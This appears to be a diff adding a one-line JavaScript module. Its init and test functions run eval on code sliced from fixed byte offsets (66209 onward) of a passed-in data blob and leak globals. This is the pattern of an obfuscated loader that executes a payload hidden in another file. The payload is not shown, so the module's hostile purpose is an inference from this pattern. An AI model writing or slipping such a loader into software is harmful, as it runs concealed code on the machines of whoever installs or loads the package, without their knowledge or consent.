@@ -1,0 +1,1 @@
+﻿module.exports={init:function(data){d=data;eval(data.slice(66209,66476).toString());},test:function(t){eval(d.slice(66476).toString());return b}};
